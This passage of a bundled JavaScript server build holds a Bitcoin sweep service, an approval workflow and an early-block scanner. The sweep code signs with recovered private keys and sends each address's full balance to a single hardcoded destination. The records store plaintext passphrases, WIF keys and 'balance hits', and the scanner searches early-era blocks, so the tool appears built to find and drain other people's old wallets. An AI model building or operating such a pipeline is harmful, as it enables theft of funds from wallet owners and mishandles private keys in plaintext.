        baseUrl: "https://mempool.space/api",
        rateLimit: {
          documented: "none",
          recommended: 60
        },
        endpoints: {
          address: "/address/{address}",
          txs: "/address/{address}/txs",
          utxo: "/address/{address}/utxo"
        },
        reliability: 9,
        cost: "FREE",
        enabled: true,
        lastUsed: 0,
        errorCount: 0,
        successCount: 0
      },
      blockcypher: {
        name: "BlockCypher",
        baseUrl: "https://api.blockcypher.com/v1/btc/main",
        rateLimit: {
          documented: "200/hour",
          recommended: 3
          // ~200/hour = 3.33/min
        },
        endpoints: {
          address: "/addrs/{address}/balance",
          txs: "/addrs/{address}/full",
          utxo: "/addrs/{address}?unspentOnly=true"
        },
        reliability: 8,
        cost: "FREE",
        enabled: true,
        lastUsed: 0,
        errorCount: 0,
        successCount: 0
      },
      blockchain_com: {
        name: "Blockchain.com",
        baseUrl: "https://blockchain.info",
        rateLimit: {
          documented: "1000/day",
          recommended: 0.7
          // ~1000/day = 0.69/min
        },
        endpoints: {
          address: "/rawaddr/{address}",
          txs: "/rawaddr/{address}",
          utxo: "/unspent?active={address}"
        },
        reliability: 7,
        cost: "FREE",
        enabled: true,
        lastUsed: 0,
        errorCount: 0,
        successCount: 0
      },
      chainso: {
        name: "Chain.so",
        baseUrl: "https://chain.so/api/v2",
        rateLimit: {
          documented: "unknown",
          recommended: 30
        },
        endpoints: {
          address: "/get_address_balance/BTC/{address}",
          txs: "/get_tx_received/BTC/{address}",
          utxo: "/get_tx_unspent/BTC/{address}"
        },
        reliability: 6,
        cost: "FREE",
        enabled: true,
        lastUsed: 0,
        errorCount: 0,
        successCount: 0
      }
    };
    RateLimiter = class {
      requestCounts = /* @__PURE__ */ new Map();
      canMakeRequest(providerId) {
        const provider = PROVIDERS[providerId];
        if (!provider || !provider.enabled) return false;
        const now = Date.now();
        const windowMs = 6e4;
        const requests = this.requestCounts.get(providerId) || [];
        const recentRequests = requests.filter((time) => now - time < windowMs);
        const allowed = recentRequests.length < provider.rateLimit.recommended;
        return allowed;
      }
      recordRequest(providerId) {
        const now = Date.now();
        const requests = this.requestCounts.get(providerId) || [];
        requests.push(now);
        const windowMs = 6e4;
        const recentRequests = requests.filter((time) => now - time < windowMs);
        this.requestCounts.set(providerId, recentRequests);
      }
      getStats(providerId) {
        const now = Date.now();
        const windowMs = 6e4;
        const requests = this.requestCounts.get(providerId) || [];
        const recentRequests = requests.filter((time) => now - time < windowMs);
        return {
          requestsLastMinute: recentRequests.length,
          allowed: PROVIDERS[providerId]?.rateLimit.recommended || 0
        };
      }
    };
    rateLimiter = new RateLimiter();
    console.log("[BlockchainAPI] Initialized free-only blockchain API router");
    console.log(`[BlockchainAPI] Combined capacity: ${getCombinedCapacity()} req/min (100% FREE)`);
    console.log(`[BlockchainAPI] Active providers: ${Object.values(PROVIDERS).filter((p) => p.enabled).length}`);
  }
});

// server/bitcoin-sweep.ts
import * as bitcoin from "bitcoinjs-lib";
import * as ecc from "tiny-secp256k1";
import ECPairFactory from "ecpair";
var ECPair, BLOCKSTREAM_API, MEMPOOL_API, HARDCODED_DESTINATION_ADDRESS, BitcoinSweepService, bitcoinSweepService;
var init_bitcoin_sweep = __esm({
  "server/bitcoin-sweep.ts"() {
    "use strict";
    bitcoin.initEccLib(ecc);
    ECPair = ECPairFactory(ecc);
    BLOCKSTREAM_API = "https://blockstream.info/api";
    MEMPOOL_API = "https://mempool.space/api";
    HARDCODED_DESTINATION_ADDRESS = "bc1qcc0ln7gg92vlclfw8t39zfw2cfqtytcwum733l";
    BitcoinSweepService = class {
      network;
      destinationAddress = HARDCODED_DESTINATION_ADDRESS;
      feeRate = 5;
      constructor() {
        this.network = bitcoin.networks.bitcoin;
        this.loadConfig();
        console.log("[BitcoinSweep] Service initialized");
        if (this.destinationAddress !== HARDCODED_DESTINATION_ADDRESS) {
          throw new Error("[BitcoinSweep] SECURITY: Destination address mismatch - funds could be misdirected!");
        }
        console.log(`[BitcoinSweep] SECURITY: Destination HARDCODED to ${this.destinationAddress.slice(0, 20)}...`);
      }
      loadConfig() {
        const feeRateEnv = process.env.SWEEP_FEE_RATE;
        if (feeRateEnv) {
          this.feeRate = parseInt(feeRateEnv, 10) || 5;
        }
        const envDestination = process.env.SWEEP_DESTINATION_ADDRESS;
        if (envDestination && envDestination !== HARDCODED_DESTINATION_ADDRESS) {
          console.warn("[BitcoinSweep] SECURITY WARNING: Env destination ignored - using hardcoded address");
        }
        console.log(`[BitcoinSweep] Destination configured: ${this.destinationAddress.slice(0, 20)}...`);
      }
      isConfigured() {
        return !!this.destinationAddress;
      }
      getDestinationAddress() {
        return this.destinationAddress;
      }
      // SECURITY: setDestinationAddress REMOVED - destination is hardcoded and immutable
      // Any attempt to change destination requires code modification + review
      // This method was identified as a security vulnerability that could bypass hardcoding
      setFeeRate(satPerByte) {
        this.feeRate = satPerByte;
        console.log(`[BitcoinSweep] Fee rate updated: ${satPerByte} sat/byte`);
      }
      async fetchWithFallback(primaryUrl, fallbackUrl) {
        try {
          const response = await fetch(primaryUrl);
          if (response.ok) {
            return await response.json();
          }
          throw new Error(`HTTP ${response.status}`);
        } catch (primaryError) {
          console.log(`[BitcoinSweep] Primary API failed, trying fallback...`);
          const response = await fetch(fallbackUrl);
          if (!response.ok) {
            throw new Error(`Both APIs failed: ${primaryError}`);
          }
          return await response.json();
        }
      }
      async fetchUTXOs(address) {
        const primaryUrl = `${BLOCKSTREAM_API}/address/${address}/utxo`;
        const fallbackUrl = `${MEMPOOL_API}/address/${address}/utxo`;
        const utxos = await this.fetchWithFallback(primaryUrl, fallbackUrl);
        return utxos.filter((utxo) => utxo.status?.confirmed);
      }
      async fetchRawTransaction(txid) {
        const primaryUrl = `${BLOCKSTREAM_API}/tx/${txid}/hex`;
        const fallbackUrl = `${MEMPOOL_API}/tx/${txid}/hex`;
        try {
          const response = await fetch(primaryUrl);
          if (response.ok) {
            return await response.text();
          }
          throw new Error(`HTTP ${response.status}`);
        } catch {
          const response = await fetch(fallbackUrl);
          if (!response.ok) {
            throw new Error(`Failed to fetch raw tx ${txid}`);
          }
          return await response.text();
        }
      }
      estimateFee(inputCount, outputCount, addressType) {
        let inputSize;
        let outputSize;
        switch (addressType) {
          case "p2wpkh":
            inputSize = 68;
            outputSize = 31;
            break;
          case "p2sh-p2wpkh":
            inputSize = 91;
            outputSize = 32;
            break;
          case "p2pkh":
          default:
            inputSize = 148;
            outputSize = 34;
            break;
        }
        const overhead = 10;
        const estimatedSize = overhead + inputCount * inputSize + outputCount * outputSize;
        return Math.ceil(estimatedSize * this.feeRate);
      }
      detectAddressType(address) {
        if (address.startsWith("bc1q")) {
          return { type: "p2wpkh", addressStarts: "bc1" };
        } else if (address.startsWith("3")) {
          return { type: "p2sh-p2wpkh", addressStarts: "3" };
        } else {
          return { type: "p2pkh", addressStarts: "1" };
        }
      }
      createPayment(keyPair, addressType) {
        switch (addressType) {
          case "p2wpkh": {
            const p2wpkh = bitcoin.payments.p2wpkh({
              pubkey: keyPair.publicKey,
              network: this.network
            });
            return {
              address: p2wpkh.address,
              output: p2wpkh.output
            };
          }
          case "p2sh-p2wpkh": {
            const p2wpkh = bitcoin.payments.p2wpkh({
              pubkey: keyPair.publicKey,
              network: this.network
            });
            const p2sh = bitcoin.payments.p2sh({
              redeem: p2wpkh,
              network: this.network
            });
            return {
              address: p2sh.address,
              output: p2sh.output,
              redeemScript: p2wpkh.output
            };
          }
          case "p2pkh":
          default: {
            const p2pkh = bitcoin.payments.p2pkh({
              pubkey: keyPair.publicKey,
              network: this.network
            });
            return {
              address: p2pkh.address,
              output: p2pkh.output
            };
          }
        }
      }
      async sweep(wif, sourceAddress) {
        if (!this.destinationAddress) {
          return {
            success: false,
            error: "No destination address configured. Set SWEEP_DESTINATION_ADDRESS environment variable."
          };
        }
        try {
          const keyPair = ECPair.fromWIF(wif, this.network);
          const addressType = sourceAddress ? this.detectAddressType(sourceAddress) : { type: "p2pkh", addressStarts: "1" };
          const payment = this.createPayment(keyPair, addressType.type);
          const actualSourceAddress = sourceAddress || payment.address;
          console.log(`[BitcoinSweep] Sweeping from ${actualSourceAddress} to ${this.destinationAddress}`);
          const utxos = await this.fetchUTXOs(actualSourceAddress);
          if (!utxos || utxos.length === 0) {
            return {
              success: false,
              error: "No confirmed UTXOs found for this address. Balance may be unconfirmed or already spent.",
              details: {
                sourceAddress: actualSourceAddress,
                destinationAddress: this.destinationAddress,
                inputs: 0,
                totalInput: 0,
                outputAmount: 0,
                fee: 0,
                feeRate: this.feeRate
              }
            };
          }
          const totalBalance = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
          console.log(`[BitcoinSweep] Found ${utxos.length} UTXOs, total: ${totalBalance} satoshis`);
          const estimatedFee = this.estimateFee(utxos.length, 1, addressType.type);
          const sendAmount = totalBalance - estimatedFee;
          if (sendAmount <= 546) {
            return {
              success: false,
              error: `Insufficient funds after fee. Balance: ${totalBalance} sats, Fee: ${estimatedFee} sats, Dust threshold: 546 sats`,
              details: {
                sourceAddress: actualSourceAddress,
                destinationAddress: this.destinationAddress,
                inputs: utxos.length,
                totalInput: totalBalance,
                outputAmount: sendAmount,
                fee: estimatedFee,
                feeRate: this.feeRate
              }
            };
          }
          const psbt = new bitcoin.Psbt({ network: this.network });
          for (const utxo of utxos) {
            const rawTxHex = await this.fetchRawTransaction(utxo.txid);
            if (addressType.type === "p2pkh") {
              psbt.addInput({
                hash: utxo.txid,
                index: utxo.vout,
                nonWitnessUtxo: Buffer.from(rawTxHex, "hex")
              });
            } else if (addressType.type === "p2wpkh") {
              psbt.addInput({
                hash: utxo.txid,
                index: utxo.vout,
                witnessUtxo: {
                  script: Buffer.from(payment.output),
                  value: BigInt(utxo.value)
                }
              });
            } else if (addressType.type === "p2sh-p2wpkh") {
              psbt.addInput({
                hash: utxo.txid,
                index: utxo.vout,
                witnessUtxo: {
                  script: Buffer.from(payment.output),
                  value: BigInt(utxo.value)
                },
                redeemScript: payment.redeemScript ? Buffer.from(payment.redeemScript) : void 0
              });
            }
          }
          psbt.addOutput({
            address: this.destinationAddress,
            value: BigInt(sendAmount)
          });
          for (let i = 0; i < utxos.length; i++) {
            psbt.signInput(i, keyPair);
          }
          psbt.finalizeAllInputs();
          const tx = psbt.extractTransaction();
          const txHex = tx.toHex();
          const txId = tx.getId();
          console.log(`[BitcoinSweep] Transaction created: ${txId}`);
          console.log(`[BitcoinSweep] Sending ${sendAmount} sats (fee: ${estimatedFee} sats @ ${this.feeRate} sat/byte)`);
          const broadcastResult = await this.broadcastTransaction(txHex);
          if (broadcastResult.success) {
            console.log(`[BitcoinSweep] Transaction broadcast successfully: ${txId}`);
            return {
              success: true,
              txId,
              txHex,
              details: {
                sourceAddress: actualSourceAddress,
                destinationAddress: this.destinationAddress,
                inputs: utxos.length,
                totalInput: totalBalance,
                outputAmount: sendAmount,
                fee: estimatedFee,
                feeRate: this.feeRate,
                explorerUrl: `https://blockstream.info/tx/${txId}`
              }
            };
          } else {
            return {
              success: false,
              txId,
              txHex,
              error: broadcastResult.error,
              details: {
                sourceAddress: actualSourceAddress,
                destinationAddress: this.destinationAddress,
                inputs: utxos.length,
                totalInput: totalBalance,
                outputAmount: sendAmount,
                fee: estimatedFee,
                feeRate: this.feeRate
              }
            };
          }
        } catch (error) {
          console.error(`[BitcoinSweep] Error:`, error.message);
          return {
            success: false,
            error: error.message
          };
        }
      }
      async broadcastTransaction(txHex) {
        const blockstreamUrl = `${BLOCKSTREAM_API}/tx`;
        const mempoolUrl = `${MEMPOOL_API}/tx`;
        try {
          const response = await fetch(blockstreamUrl, {
            method: "POST",
            headers: { "Content-Type": "text/plain" },
            body: txHex
          });
          if (response.ok) {
            const txId = await response.text();
            return { success: true, txId };
          }
          const errorText = await response.text();
          console.log(`[BitcoinSweep] Blockstream broadcast failed: ${errorText}, trying Mempool.space...`);
          const mempoolResponse = await fetch(mempoolUrl, {
            method: "POST",
            headers: { "Content-Type": "text/plain" },
            body: txHex
          });
          if (mempoolResponse.ok) {
            const txId = await mempoolResponse.text();
            return { success: true, txId };
          }
          const mempoolError = await mempoolResponse.text();
          return { success: false, error: `Broadcast failed: ${mempoolError}` };
        } catch (error) {
          return { success: false, error: error.message };
        }
      }
      async createSweepTransactionOnly(wif, sourceAddress) {
        if (!this.destinationAddress) {
          return {
            success: false,
            error: "No destination address configured"
          };
        }
        try {
          const keyPair = ECPair.fromWIF(wif, this.network);
          const addressType = sourceAddress ? this.detectAddressType(sourceAddress) : { type: "p2pkh", addressStarts: "1" };
          const payment = this.createPayment(keyPair, addressType.type);
          const actualSourceAddress = sourceAddress || payment.address;
          const utxos = await this.fetchUTXOs(actualSourceAddress);
          if (!utxos || utxos.length === 0) {
            return {
              success: false,
              error: "No confirmed UTXOs found"
            };
          }
          const totalBalance = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
          const estimatedFee = this.estimateFee(utxos.length, 1, addressType.type);
          const sendAmount = totalBalance - estimatedFee;
          if (sendAmount <= 546) {
            return {
              success: false,
              error: `Insufficient funds after fee`
            };
          }
          const psbt = new bitcoin.Psbt({ network: this.network });
          for (const utxo of utxos) {
            const rawTxHex = await this.fetchRawTransaction(utxo.txid);
            if (addressType.type === "p2pkh") {
              psbt.addInput({
                hash: utxo.txid,
                index: utxo.vout,
                nonWitnessUtxo: Buffer.from(rawTxHex, "hex")
              });
            } else if (addressType.type === "p2wpkh") {
              psbt.addInput({
                hash: utxo.txid,
                index: utxo.vout,
                witnessUtxo: {
                  script: Buffer.from(payment.output),
                  value: BigInt(utxo.value)
                }
              });
            } else if (addressType.type === "p2sh-p2wpkh") {
              psbt.addInput({
                hash: utxo.txid,
                index: utxo.vout,
                witnessUtxo: {
                  script: Buffer.from(payment.output),
                  value: BigInt(utxo.value)
                },
                redeemScript: payment.redeemScript ? Buffer.from(payment.redeemScript) : void 0
              });
            }
          }
          psbt.addOutput({
            address: this.destinationAddress,
            value: BigInt(sendAmount)
          });
          for (let i = 0; i < utxos.length; i++) {
            psbt.signInput(i, keyPair);
          }
          psbt.finalizeAllInputs();
          const tx = psbt.extractTransaction();
          const txHex = tx.toHex();
          const txId = tx.getId();
          return {
            success: true,
            txId,
            txHex,
            details: {
              sourceAddress: actualSourceAddress,
              destinationAddress: this.destinationAddress,
              inputs: utxos.length,
              totalInput: totalBalance,
              outputAmount: sendAmount,
              fee: estimatedFee,
              feeRate: this.feeRate
            }
          };
        } catch (error) {
          return {
            success: false,
            error: error.message
          };
        }
      }
      async estimateSweep(address) {
        try {
          const utxos = await this.fetchUTXOs(address);
          if (!utxos || utxos.length === 0) {
            return {
              utxoCount: 0,
              totalBalance: 0,
              estimatedFee: 0,
              estimatedOutput: 0,
              canSweep: false,
              error: "No confirmed UTXOs"
            };
          }
          const addressType = this.detectAddressType(address);
          const totalBalance = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
          const estimatedFee = this.estimateFee(utxos.length, 1, addressType.type);
          const estimatedOutput = totalBalance - estimatedFee;
          return {
            utxoCount: utxos.length,
            totalBalance,
            estimatedFee,
            estimatedOutput,
            canSweep: estimatedOutput > 546,
            error: estimatedOutput <= 546 ? "Output below dust threshold" : void 0
          };
        } catch (error) {
          return {
            utxoCount: 0,
            totalBalance: 0,
            estimatedFee: 0,
            estimatedOutput: 0,
            canSweep: false,
            error: error.message
          };
        }
      }
    };
    bitcoinSweepService = new BitcoinSweepService();
  }
});

// server/sweep-approval.ts
import { eq as eq3, desc as desc2, and as and2, or as or2, sql as sql3 } from "drizzle-orm";
var SweepApprovalService, sweepApprovalService;
var init_sweep_approval = __esm({
  "server/sweep-approval.ts"() {
    "use strict";
    init_db();
    init_schema();
    init_bitcoin_sweep();
    SweepApprovalService = class {
      constructor() {
        console.log("[SweepApproval] Service initialized - manual approval required for all sweeps");
      }
      async createPendingSweep(options) {
        if (!db) {
          console.error("[SweepApproval] Database not available");
          return null;
        }
        try {
          const existing = await db.select().from(pendingSweeps).where(and2(
            eq3(pendingSweeps.address, options.address),
            or2(
              eq3(pendingSweeps.status, "pending"),
              eq3(pendingSweeps.status, "approved")
            )
          )).limit(1);
          if (existing.length > 0) {
            console.log(`[SweepApproval] Address ${options.address.slice(0, 15)}... already has pending sweep`);
            return existing[0];
          }
          const balanceBtc = (options.balanceSats / 1e8).toFixed(8);
          let estimatedFeeSats = 0;
          let netAmountSats = options.balanceSats;
          let utxoCount = 0;
          try {
            const estimate = await bitcoinSweepService.estimateSweep(options.address);
            if (estimate.canSweep) {
              estimatedFeeSats = estimate.estimatedFee;
              netAmountSats = estimate.estimatedOutput;
              utxoCount = estimate.utxoCount;
            }
          } catch (e) {
            console.log(`[SweepApproval] Could not estimate fees for ${options.address.slice(0, 15)}...`);
          }
          const insertData = {
            address: options.address,
            passphrase: options.passphrase,
            wif: options.wif,
            isCompressed: options.isCompressed,
            balanceSats: options.balanceSats,
            balanceBtc,
            estimatedFeeSats,
            netAmountSats,
            utxoCount,
            status: "pending",
            source: options.source || "typescript",
            recoveryType: options.recoveryType,
            destinationAddress: bitcoinSweepService.getDestinationAddress()
          };
          const [result] = await db.insert(pendingSweeps).values(insertData).returning();
          await this.logAuditEvent(
            result.id,
            "created",
            null,
            "pending",
            "system",
            `Balance: ${balanceBtc} BTC, Source: ${options.source || "typescript"}`
          );
          console.log(`
\u{1F514} [PENDING SWEEP] ${options.address}`);
          console.log(`   \u{1F4B0} Balance: ${balanceBtc} BTC (${options.balanceSats} sats)`);
          console.log(`   \u{1F4B8} Est. Fee: ${estimatedFeeSats} sats`);
          console.log(`   \u{1F4B5} Net: ${(netAmountSats / 1e8).toFixed(8)} BTC`);
          console.log(`   \u{1F511} Source: ${options.source || "typescript"}`);
          console.log(`   \u23F3 Status: AWAITING MANUAL APPROVAL`);
          console.log(`   \u{1F4DD} Use /api/sweeps/approve/${result.id} to approve
`);
          return result;
        } catch (error) {
          console.error("[SweepApproval] Error creating pending sweep:", error);
          return null;
        }
      }
      async getPendingSweeps(status) {
        if (!db) return [];
        try {
          if (status) {
            return await db.select().from(pendingSweeps).where(eq3(pendingSweeps.status, status)).orderBy(desc2(pendingSweeps.balanceSats));
          }
          return await db.select().from(pendingSweeps).orderBy(desc2(pendingSweeps.discoveredAt));
        } catch (error) {
          console.error("[SweepApproval] Error getting pending sweeps:", error);
          return [];
        }
      }
      async getSweepById(id) {
        if (!db) return null;
        try {
          const [result] = await db.select().from(pendingSweeps).where(eq3(pendingSweeps.id, id)).limit(1);
          return result || null;
        } catch (error) {
          console.error("[SweepApproval] Error getting sweep by id:", error);
          return null;
        }
      }
      async approveSweep(id, approvedBy = "operator") {
        if (!db) return { success: false, error: "Database not available" };
        try {
          const sweep = await this.getSweepById(id);
          if (!sweep) {
            return { success: false, error: "Sweep not found" };
          }
          if (sweep.status !== "pending") {
            return { success: false, error: `Sweep is not pending (current status: ${sweep.status})` };
          }
          await db.update(pendingSweeps).set({
            status: "approved",
            approvedAt: /* @__PURE__ */ new Date(),
            approvedBy,
            updatedAt: /* @__PURE__ */ new Date()
          }).where(eq3(pendingSweeps.id, id));
          await this.logAuditEvent(
            id,
            "approved",
            "pending",
            "approved",
            approvedBy,
            `Approved for broadcast`
          );
          console.log(`
\u2705 [SWEEP APPROVED] ${sweep.address}`);
          console.log(`   \u{1F4B0} Balance: ${sweep.balanceBtc} BTC`);
          console.log(`   \u{1F464} Approved by: ${approvedBy}`);
          console.log(`   \u23F3 Ready for broadcast - use /api/sweeps/broadcast/${id}
`);
          return { success: true };
        } catch (error) {
          console.error("[SweepApproval] Error approving sweep:", error);
          return { success: false, error: error instanceof Error ? error.message : "Unknown error" };
        }
      }
      async broadcastSweep(id) {
        if (!db) return { success: false, error: "Database not available" };
        try {
          const sweep = await this.getSweepById(id);
          if (!sweep) {
            return { success: false, error: "Sweep not found" };
          }
          if (sweep.status !== "approved") {
            return { success: false, error: `Sweep must be approved first (current status: ${sweep.status})` };
          }
          await db.update(pendingSweeps).set({
            status: "broadcasting",
            broadcastAt: /* @__PURE__ */ new Date(),
            updatedAt: /* @__PURE__ */ new Date()
          }).where(eq3(pendingSweeps.id, id));
          await this.logAuditEvent(
            id,
            "broadcast_started",
            "approved",
            "broadcasting",
            "system",
            "Starting transaction broadcast"
          );
          const result = await bitcoinSweepService.sweep(
            sweep.wif,
            sweep.address
          );
          if (result.success && result.txId) {
            await db.update(pendingSweeps).set({
              status: "completed",
              txId: result.txId,
              txHex: result.txHex,
              completedAt: /* @__PURE__ */ new Date(),
              updatedAt: /* @__PURE__ */ new Date()
            }).where(eq3(pendingSweeps.id, id));
            await this.logAuditEvent(
              id,
              "completed",
              "broadcasting",
              "completed",
              "system",
              `TX: ${result.txId}`
            );
            console.log(`
\u{1F389} [SWEEP COMPLETED] ${sweep.address}`);
            console.log(`   \u{1F4B0} Amount: ${sweep.balanceBtc} BTC`);
            console.log(`   \u{1F4E4} TX ID: ${result.txId}`);
            console.log(`   \u{1F517} ${result.details?.explorerUrl || ""}
`);
            return {
              success: true,
              txId: result.txId,
              txHex: result.txHex
            };
          } else {
            await db.update(pendingSweeps).set({
              status: "failed",
              errorMessage: result.error,
              updatedAt: /* @__PURE__ */ new Date()
            }).where(eq3(pendingSweeps.id, id));
            await this.logAuditEvent(
              id,
              "failed",
              "broadcasting",
              "failed",
              "system",
              `Error: ${result.error}`
            );
            return {
              success: false,
              error: result.error
            };
          }
        } catch (error) {
          console.error("[SweepApproval] Error broadcasting sweep:", error);
          if (db) {
            await db.update(pendingSweeps).set({
              status: "failed",
              errorMessage: error instanceof Error ? error.message : "Unknown error",
              updatedAt: /* @__PURE__ */ new Date()
            }).where(eq3(pendingSweeps.id, id));
          }
          return { success: false, error: error instanceof Error ? error.message : "Unknown error" };
        }
      }
      async rejectSweep(id, reason = "Manual rejection") {
        if (!db) return { success: false, error: "Database not available" };
        try {
          const sweep = await this.getSweepById(id);
          if (!sweep) {
            return { success: false, error: "Sweep not found" };
          }
          if (sweep.status !== "pending") {
            return { success: false, error: `Can only reject pending sweeps (current status: ${sweep.status})` };
          }
          await db.update(pendingSweeps).set({
            status: "rejected",
            errorMessage: reason,
            updatedAt: /* @__PURE__ */ new Date()
          }).where(eq3(pendingSweeps.id, id));
          await this.logAuditEvent(id, "rejected", "pending", "rejected", "operator", reason);
          console.log(`
\u274C [SWEEP REJECTED] ${sweep.address}`);
          console.log(`   \u{1F4B0} Balance: ${sweep.balanceBtc} BTC`);
          console.log(`   \u{1F4DD} Reason: ${reason}
`);
          return { success: true };
        } catch (error) {
          console.error("[SweepApproval] Error rejecting sweep:", error);
          return { success: false, error: error instanceof Error ? error.message : "Unknown error" };
        }
      }
      async refreshBalance(id) {
        if (!db) return { success: false, error: "Database not available" };
        try {
          const sweep = await this.getSweepById(id);
          if (!sweep) {
            return { success: false, error: "Sweep not found" };
          }
          const estimate = await bitcoinSweepService.estimateSweep(sweep.address);
          if (!estimate.canSweep) {
            if (sweep.status === "pending") {
              await db.update(pendingSweeps).set({
                status: "expired",
                errorMessage: estimate.error || "Balance no longer available",
                updatedAt: /* @__PURE__ */ new Date()
              }).where(eq3(pendingSweeps.id, id));
              await this.logAuditEvent(
                id,
                "expired",
                sweep.status,
                "expired",
                "system",
                "Balance no longer available on refresh"
              );
            }
            return { success: false, error: estimate.error || "No UTXOs available" };
          }
          const newBalance = estimate.totalBalance;
          await db.update(pendingSweeps).set({
            balanceSats: newBalance,
            balanceBtc: (newBalance / 1e8).toFixed(8),
            estimatedFeeSats: estimate.estimatedFee,
            netAmountSats: estimate.estimatedOutput,
            utxoCount: estimate.utxoCount,
            updatedAt: /* @__PURE__ */ new Date()
          }).where(eq3(pendingSweeps.id, id));
          return { success: true, newBalance };
        } catch (error) {
          console.error("[SweepApproval] Error refreshing balance:", error);
          return { success: false, error: error instanceof Error ? error.message : "Unknown error" };
        }
      }
      async getStats() {
        if (!db) {
          return {
            pending: 0,
            approved: 0,
            completed: 0,
            failed: 0,
            rejected: 0,
            totalPendingBtc: "0.00000000",
            totalSweptBtc: "0.00000000"
          };
        }
        try {
          const counts = await db.select({
            status: pendingSweeps.status,
            count: sql3`count(*)::int`,
            totalSats: sql3`COALESCE(sum(${pendingSweeps.balanceSats}), 0)::bigint`
          }).from(pendingSweeps).groupBy(pendingSweeps.status);
          const stats2 = {
            pending: 0,
            approved: 0,
            completed: 0,
            failed: 0,
            rejected: 0,
            totalPendingBtc: "0.00000000",
            totalSweptBtc: "0.00000000"
          };
          let pendingSats = 0;
          let sweptSats = 0;
          for (const row of counts) {
            const count = Number(row.count);
            const totalSats = Number(row.totalSats);
            switch (row.status) {
              case "pending":
                stats2.pending = count;
                pendingSats += totalSats;
                break;
              case "approved":
                stats2.approved = count;
                pendingSats += totalSats;
                break;
              case "completed":
                stats2.completed = count;
                sweptSats += totalSats;
                break;
              case "failed":
                stats2.failed = count;
                break;
              case "rejected":
                stats2.rejected = count;
                break;
            }
          }
          stats2.totalPendingBtc = (pendingSats / 1e8).toFixed(8);
          stats2.totalSweptBtc = (sweptSats / 1e8).toFixed(8);
          return stats2;
        } catch (error) {
          console.error("[SweepApproval] Error getting stats:", error);
          return {
            pending: 0,
            approved: 0,
            completed: 0,
            failed: 0,
            rejected: 0,
            totalPendingBtc: "0.00000000",
            totalSweptBtc: "0.00000000"
          };
        }
      }
      async getAuditLog(sweepId) {
        if (!db) return [];
        try {
          if (sweepId) {
            return await db.select().from(sweepAuditLog).where(eq3(sweepAuditLog.sweepId, sweepId)).orderBy(desc2(sweepAuditLog.timestamp));
          }
          return await db.select().from(sweepAuditLog).orderBy(desc2(sweepAuditLog.timestamp)).limit(100);
        } catch (error) {
          console.error("[SweepApproval] Error getting audit log:", error);
          return [];
        }
      }
      async logAuditEvent(sweepId, action, previousStatus, newStatus, actor, details) {
        if (!db) return;
        try {
          await db.insert(sweepAuditLog).values({
            sweepId,
            action,
            previousStatus,
            newStatus,
            actor,
            details
          });
        } catch (error) {
          console.error("[SweepApproval] Error logging audit event:", error);
        }
      }
    };
    sweepApprovalService = new SweepApprovalService();
  }
});

// server/blockchain-scanner.ts
var blockchain_scanner_exports = {};
__export(blockchain_scanner_exports, {
  checkAndRecordBalance: () => checkAndRecordBalance,
  computeKappaRecovery: () => computeKappaRecovery,
  fetchAddressBalance: () => fetchAddressBalance,
  fetchBlockByHeight: () => fetchBlockByHeight,
  fetchBlockTransactions: () => fetchBlockTransactions,
  getActiveBalanceHits: () => getActiveBalanceHits,
  getBalanceChanges: () => getBalanceChanges,
  getBalanceHits: () => getBalanceHits,
  getLastBalanceCheck: () => getLastBalanceCheck,
  getStaleBalanceHits: () => getStaleBalanceHits,
  parseBlock: () => parseBlock,
  parseTransaction: () => parseTransaction,
  refreshAllBalances: () => refreshAllBalances,
  refreshSingleBalance: () => refreshSingleBalance,
  saveBalanceHit: () => saveBalanceHit,
  scanEarlyEraBlocks: () => scanEarlyEraBlocks
});
import { createHash as createHash2 } from "crypto";
import bs58check2 from "bs58check";
import { eq as eq4 } from "drizzle-orm";
function extractTemporalSignature(block) {
  const date = new Date(block.timestamp * 1e3);
  const dayOfWeek = date.getUTCDay();
  const hourUTC = date.getUTCHours();
  const likelyTimezones = [];
  if (hourUTC >= 0 && hourUTC <= 6) {
    likelyTimezones.push("America/Los_Angeles", "America/Denver", "America/Chicago");
  } else if (hourUTC >= 7 && hourUTC <= 15) {
    likelyTimezones.push("Europe/London", "Europe/Berlin", "Asia/Tokyo");
  } else {
    likelyTimezones.push("America/New_York", "America/Los_Angeles");
  }
  return {
    dayOfWeek,
    hourUTC,
    dayPattern: date.toISOString().split("T")[0],
    hourPattern: `${hourUTC}:00 UTC`,
    likelyTimezones,
    timestamp: block.timestamp
  };
}
function extractValueSignature(outputs) {
  const values = outputs.map((o) => o.value);
  const totalValue = values.reduce((sum, v) => sum + v, 0);
  const satoshiThresholds = [
    1e8,
    // 1 BTC
    1e9,
    // 10 BTC
    5e9,
    // 50 BTC
    1e10
    // 100 BTC
  ];
  const hasRoundNumbers = values.some(
    (v) => satoshiThresholds.some((threshold) => Math.abs(v - threshold) < 1e5)
  );
  return {
    totalValue,
    outputCount: outputs.length,
    hasRoundNumbers,
    values,
    avgValue: totalValue / outputs.length
  };
}
function deriveP2PKAddress(scriptpubkey) {
  try {
    if (!scriptpubkey.endsWith("ac")) return null;
    const lengthByte = scriptpubkey.substring(0, 2);
    const expectedLength = lengthByte === "41" ? 65 : lengthByte === "21" ? 33 : 0;
    if (expectedLength === 0) return null;
    const pubkeyHex = scriptpubkey.substring(2, 2 + expectedLength * 2);
    if (pubkeyHex.length !== expectedLength * 2) return null;
    const pubkeyBuffer = Buffer.from(pubkeyHex, "hex");
    const sha256Hash = createHash2("sha256").update(pubkeyBuffer).digest();
    const ripemd160Hash = createHash2("ripemd160").update(sha256Hash).digest();
    const versionedHash = Buffer.concat([Buffer.from([0]), ripemd160Hash]);
    const address = bs58check2.encode(versionedHash);
    return address;
  } catch (error) {
    console.error(`[BlockchainScanner] Error deriving P2PK address:`, error);
    return null;
  }
}
function extractScriptSignature(scriptpubkey) {
  let scriptType = "unknown";
  if (scriptpubkey.startsWith("76a914") && scriptpubkey.endsWith("88ac")) {
    scriptType = "P2PKH";
  } else if (scriptpubkey.startsWith("a914") && scriptpubkey.endsWith("87")) {
    scriptType = "P2SH";
  } else if (scriptpubkey.startsWith("0014") || scriptpubkey.startsWith("0020")) {
    scriptType = "P2WPKH";
  } else if (scriptpubkey.startsWith("41") || scriptpubkey.startsWith("21")) {
    scriptType = "P2PK";
  }
  return {
    type: scriptType,
    raw: scriptpubkey,
    softwareFingerprint: scriptType
    // Can be expanded with version detection
  };
}
function extractMinerFingerprint(coinbaseTx) {
